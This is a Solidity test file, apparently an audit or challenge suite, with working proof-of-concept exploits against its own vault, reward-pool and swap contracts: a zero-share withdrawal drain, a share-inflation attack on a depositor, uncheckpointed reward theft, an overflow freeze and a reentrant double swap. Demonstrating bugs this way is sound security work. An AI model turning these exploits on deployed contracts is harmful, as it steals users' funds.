// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "../src/ShareVault.sol";
import "../src/RewardPool.sol";
import "../src/SimplePair.sol";
import "../src/LendingPool.sol";

interface Vm { function warp(uint256) external; }

contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function mint(address to, uint256 a) external { balanceOf[to] += a; }
    function approve(address s, uint256 a) external returns (bool) { allowance[msg.sender][s] = a; return true; }
    function transfer(address to, uint256 a) public virtual returns (bool) { balanceOf[msg.sender] -= a; balanceOf[to] += a; _hook(to, a); return true; }
    function transferFrom(address f, address to, uint256 a) external returns (bool) { allowance[f][msg.sender] -= a; balanceOf[f] -= a; balanceOf[to] += a; return true; }
    function _hook(address, uint256) internal virtual {}
}
interface IHook { function onReceive(uint256) external; }
contract HookToken is MockERC20 {
    function _hook(address to, uint256 a) internal override { if (to.code.length > 0) IHook(to).onReceive(a); }
}

contract Actor {
    function call(address t, bytes memory d) external returns (bytes memory r) { bool ok; (ok, r) = t.call(d); require(ok, "actor call failed"); }
}

contract ReenterAttacker {
    SimplePair p; uint256 out; uint256 depth;
    constructor(SimplePair p_) { p = p_; }
    function go(uint256 o) external { out = o; p.swap0For1(o, address(this)); }
    function onReceive(uint256) external { if (msg.sender == address(p.token1()) && depth < 1) { depth++; p.swap0For1(out, address(this)); } }
}

contract ChallengeTest {
    Vm constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

    // C01: address with 0 shares withdraws assets burning 0 shares
    function test_C01_zeroShareWithdraw() public {
        MockERC20 t = new MockERC20(); ShareVault v = new ShareVault(IERC20(address(t)));
        Actor honest = new Actor(); Actor thief = new Actor();
        t.mint(address(honest), 1000e18);
        honest.call(address(t), abi.encodeCall(MockERC20.approve, (address(v), type(uint256).max)));
        honest.call(address(v), abi.encodeCall(ShareVault.deposit, (1000))); // 1000 shares
        t.mint(address(v), 1000e18); // yield/donation -> rate ~1e18 per share
        uint256 ta = v.totalAssets(); uint256 ts = v.totalSupply();
        uint256 amt = (ta - 1) / ts; // largest assets with 0 shares burned
        uint256 stolen;
        for (uint256 i = 0; i < 2000 && v.totalAssets() > v.totalSupply(); i++) {
            uint256 a = (v.totalAssets() - 1) / v.totalSupply();
            if (a == 0) break;
            thief.call(address(v), abi.encodeCall(ShareVault.withdraw, (a)));
            stolen += a;
        }
        require(v.balanceOf(address(thief)) == 0, "thief has shares");
        require(amt > 0 && stolen > 800e18, "not drained"); // geometric: ~TA/TS per call

    }

    // C01 realistic: 1:1 decimals shares, 10% yield -> each 0-share withdraw yields 1 wei max
    function test_C01_realisticDust() public {
        MockERC20 t = new MockERC20(); ShareVault v = new ShareVault(IERC20(address(t)));
        t.mint(address(this), 1000e18); t.approve(address(v), 1000e18); v.deposit(1000e18);
        t.mint(address(v), 100e18);
        Actor thief = new Actor();
        uint256 a = (v.totalAssets() - 1) / v.totalSupply();
        require(a == 1, "max zero-share withdraw is 1 wei");
        thief.call(address(v), abi.encodeCall(ShareVault.withdraw, (1)));
        require(t.balanceOf(address(thief)) == 1 && v.balanceOf(address(thief)) == 0, "dust");
        (bool ok,) = address(thief).call(abi.encodeCall(Actor.call, (address(v), abi.encodeCall(ShareVault.withdraw, (2)))));
        require(!ok, "2 wei should burn 1 share and underflow");
    }

    // C02: inflation attack; victim deposit mints 0 shares
    function test_C02_inflation() public {
        MockERC20 t = new MockERC20(); ShareVault v = new ShareVault(IERC20(address(t)));
        Actor atk = new Actor(); Actor vic = new Actor();
        t.mint(address(atk), 101e18); t.mint(address(vic), 100e18);
        atk.call(address(t), abi.encodeCall(MockERC20.approve, (address(v), type(uint256).max)));
        vic.call(address(t), abi.encodeCall(MockERC20.approve, (address(v), type(uint256).max)));
        atk.call(address(v), abi.encodeCall(ShareVault.deposit, (1)));
        atk.call(address(t), abi.encodeCall(MockERC20.transfer, (address(v), 100e18)));
        vic.call(address(v), abi.encodeCall(ShareVault.deposit, (100e18)));
        require(v.balanceOf(address(vic)) == 0, "victim got shares");
        atk.call(address(v), abi.encodeCall(ShareVault.redeem, (1)));
        require(t.balanceOf(address(atk)) == 201e18, "attacker did not capture");
    }

    // C03: fresh staker credited all historical rewardPerToken
    function test_C03_noCheckpoint() public {
        MockERC20 s = new MockERC20(); MockERC20 r = new MockERC20();
        RewardPool p = new RewardPool(IERC20(address(s)), IERC20(address(r)));
        p.setRewardRate(1e18);
        r.mint(address(p), 1_000_000e18);
        Actor a = new Actor(); Actor b = new Actor();
        s.mint(address(a), 100e18); s.mint(address(b), 100e18);
        a.call(address(s), abi.encodeCall(MockERC20.approve, (address(p), type(uint256).max)));
        b.call(address(s), abi.encodeCall(MockERC20.approve, (address(p), type(uint256).max)));
        a.call(address(p), abi.encodeCall(RewardPool.stake, (100e18)));
        vm.warp(block.timestamp + 1000); // 1000e18 emitted, all to A
        b.call(address(p), abi.encodeCall(RewardPool.stake, (100e18)));
        uint256 eb = p.earned(address(b));
        require(eb == 1000e18, "B not credited history");
        b.call(address(p), abi.encodeCall(RewardPool.claim, ()));
        require(r.balanceOf(address(b)) == 1000e18, "B claim");
    }

    // C12: extreme rate -> every path reverts after time passes, including setRewardRate
    function test_C12_overflowFreeze() public {
        MockERC20 s = new MockERC20(); MockERC20 r = new MockERC20();
        RewardPool p = new RewardPool(IERC20(address(s)), IERC20(address(r)));
        Actor a = new Actor(); s.mint(address(a), 10);
        a.call(address(s), abi.encodeCall(MockERC20.approve, (address(p), type(uint256).max)));
        a.call(address(p), abi.encodeCall(RewardPool.stake, (10)));
        p.setRewardRate(type(uint256).max / 1e18 + 1);
        // same block: dt=0, owner can still undo
        (bool okSame,) = address(p).call(abi.encodeCall(RewardPool.setRewardRate, (type(uint256).max / 1e18 + 1)));
        require(okSame, "same-block reset should work");
        vm.warp(block.timestamp + 1);
        (bool ok1,) = address(p).call(abi.encodeCall(RewardPool.setRewardRate, (0)));
        (bool ok2,) = address(a).call(abi.encodeCall(Actor.call, (address(p), abi.encodeCall(RewardPool.withdraw, (10)))));
        (bool ok3,) = address(a).call(abi.encodeCall(Actor.call, (address(p), abi.encodeCall(RewardPool.claim, ()))));
        require(!ok1 && !ok2 && !ok3, "not frozen");
    }

    // C08: can the vault's own functions reach totalAssets==0 with totalSupply>0? (redeem partials)
    function test_C08_redeemNeverZeroesAssets() public {
        MockERC20 t = new MockERC20(); ShareVault v = new ShareVault(IERC20(address(t)));
        t.mint(address(this), 10); t.approve(address(v), 10);
        v.deposit(10);
        v.redeem(9);
        require(v.totalSupply() == 1 && v.totalAssets() == 1, "partial redeem left 0 assets");
    }

    // C14: reentrant swap reuses input
    function test_C14_reentrantSwap() public {
        MockERC20 t0 = new MockERC20(); HookToken t1 = new HookToken();
        SimplePair p = new SimplePair(IERC20(address(t0)), IERC20(address(t1)));
        t0.mint(address(p), 1000e18); t1.mint(address(p), 1000e18); p.sync();
        ReenterAttacker atk = new ReenterAttacker(p);
        t0.mint(address(p), 100e18); // attacker input
        uint256 out = 90e18; // honest max ~90.9e18
        atk.go(out);
        require(t1.balanceOf(address(atk)) == 2 * out, "no double payout");
    }
}
